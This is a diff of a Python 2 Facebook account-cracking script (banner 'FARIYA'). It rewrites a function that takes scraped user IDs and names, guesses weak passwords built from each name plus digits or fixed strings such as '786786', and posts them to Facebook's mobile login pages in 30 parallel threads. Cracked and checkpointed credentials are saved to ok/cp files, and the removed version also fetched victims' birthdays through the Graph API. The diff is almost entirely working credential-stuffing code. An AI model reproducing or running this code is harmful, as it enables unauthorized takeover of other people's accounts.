@@ -266,76 +266,119 @@ def public():
 	print ' '
 	print("\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰")
 	
-	def main(user):
-		global loop, token
-		pwx = []
-		sys.stdout.write(
-		      '\r \033[0;97m[%s!\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
-		); sys.stdout.flush()
-		try:os.mkdir("results")
-		except OSError:pass
-		uid,name=user.split("<=>")
-		for ss in name.split(" "):
-			if len(ss)<3:
-				continue
-			else:
-				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
-					pwx.append(ss+"123")
-					pwx.append(ss+"1234")
-					pwx.append(ss+"12345")
-					pwx.append('786786')
-					pwx.append('Pakistan')
-					pwx.append('000786')
-				else:
-					pwx.append(ss+"123")
-					pwx.append(ss+"12345")
-					pwx.append('786786')
-					pwx.append('Pakistan')
-					pwx.append('000786')
-					
+	def main(arg):
+		global ok,cp,ua
+		user = arg
+		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
 		try:
-			for pw in pwx:
-				pw = pw.lower()
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
-				xo = rex.content
-				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
-					ok.append(uid+'|'+pw)
-					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  [FK-OK] '+str(uid)+'|'+str(pw)+'\n')
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			pass1 = name.lower()+'123'
+			rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': ua})
+			xo = rex.url
+			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
+				print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass1
+				ok.append(uid+' | '+pass1)
+				save = open('out/ok.txt','a') 
+				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
+				save.close()
+			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
+				print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass1
+				cp.append(uid+' | '+pass1)
+				save = open('out/cp.txt','a') 
+				save.write(' '+str(uid)+' | '+str(pass1)+'\n')
+				save.close()
+			else:
+				pass2 = name.lower()+'1234'
+				rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': ua})
+				xo = rex.url
+				if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
+					print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass2
+					ok.append(uid+' | '+pass2)
+					save = open('out/ok.txt','a') 
+					save.write(' '+str(uid)+' | '+str(pass2)+'\n')
 					save.close()
-					break
-					continue
-				if 'checkpoint' in xo:
-					try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						nama = data['name']
-						print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '|' + ttl)
-						cp.append(uid+'|'+pw+'|'+ttl)
-						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
+				elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
+					print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass2
+					cp.append(uid+' | '+pass2)
+					save = open('out/cp.txt','a') 
+					save.write(' '+str(uid)+' | '+str(pass2)+'\n')
+					save.close()
+				else:
+					pass3 = name.lower()+'12345'
+					rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': ua})
+					xo = rex.url
+					if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
+						print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass3
+						ok.append(uid+' | '+pass3)
+						save = open('out/ok.txt','a') 
+						save.write(' '+str(uid)+' | '+str(pass3)+'\n')
 						save.close()
-						break
-					except(KeyError, IOError):
-						ttl = " "
-					except:pass
-					print('\r  \033[0;93m[FK-CP] ' +uid+ '|' + pw + '       ')
-					cp.append(uid+'|'+pw)
-					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
-					save.close()
-					break
-					continue
-					
-			loop += 1
+					elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
+						print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass3
+						cp.append(uid+' | '+pass3)
+						save = open('out/cp.txt','a') 
+						save.write(' '+str(uid)+' | '+str(pass3)+'\n')
+						save.close()
+					else:
+						pass4 = '786786'
+						rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': ua})
+						xo = rex.url
+						if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
+							print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass4
+							ok.append(uid+' | '+pass4)
+							save = open('out/ok.txt','a') 
+							save.write(' '+str(uid)+' | '+str(pass4)+'\n')
+							save.close()
+						elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
+							print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass4
+							cp.append(uid+' | '+pass4)
+							save = open('out/cp.txt','a') 
+							save.write(' '+(uid)+' | '+str(pass4)+'\n')
+							save.close()
+						else:
+							pass5 = '000786'
+							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': ua})
+							xo = rex.url
+							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
+								print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass5
+								ok.append(uid+' | '+pass5)
+								save = open('out/ok.txt','a') 
+								save.write(' '+(uid)+' | '+str(pass5)+'\n')
+								save.close()
+							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
+								print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass5
+								cp.append(uid+' | '+pass5)
+								save = open('out/cp.txt','a') 
+								save.write(' '+str(uid)+' | '+str(pass5)+'\n')
+								save.close()
+							else:
+								pass6 = '102030'
+								rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'}, headers={'user-agent': ua})
+								xo = rex.url
+								if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
+									print ' \033[0;97m[\033[0;92mOK\033[0;97m] ' +uid+ ' | ' + pass6
+									ok.append(uid+' | '+pass6)
+									save = open('out/ok.txt','a') 
+									save.write(' '+(uid)+' | '+str(pass6)+'\n')
+									save.close()
+								elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
+									print ' \033[0;97m[\033[0;93mCP\033[0;97m] ' +uid+ ' | ' + pass6
+									cp.append(uid+' | '+pas6)
+									save = open('out/cp.txt','a') 
+									save.write(' '+(uid)+' | '+str(pass6)+'\n')
+									save.close()
+				
 		except:
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
+	print "\n [+] Finished"
+	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
+	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
+	exit()
 
 def followers():
 	global token
@@ -645,5 +688,3 @@ if __name__ == '__main__':
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 Run.py")
 	os.system("git pull")
 	login()
-
-
